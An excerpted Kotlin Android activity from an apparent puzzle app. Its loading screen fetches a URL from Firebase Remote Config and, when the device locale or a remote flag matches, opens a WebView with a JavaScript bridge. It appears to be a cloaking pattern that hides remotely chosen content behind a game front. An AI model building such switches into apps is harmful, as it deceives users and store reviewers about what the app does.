...
import com.lckuyabcd.dbca.databinding.ClubLoadingActivityBinding
import java.util.Locale


class PuzzleLoadingActivity : AppCompatActivity() {

    lateinit var context: Context
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        val binding = ClubLoadingActivityBinding.inflate(layoutInflater)
    ...
    fun jump() {
        ...
        mFirebaseRemoteConfig.fetchAndActivate().addOnCompleteListener(this) {
            val datas = mFirebaseRemoteConfig.getString("comlckuyabcddbca");
            ...
            try {
                ...
                Puzzlew1.loadUrl = datas.split(">")[1]
                Puzzlew1.jsBridgeObjName =
                ...
                if (Locale.getDefault().language.contains(language) || flag == "1") {
                    val intent = Intent(context, Puzzlew1::class.java)
                    startActivity(intent)
                    finish()
                }
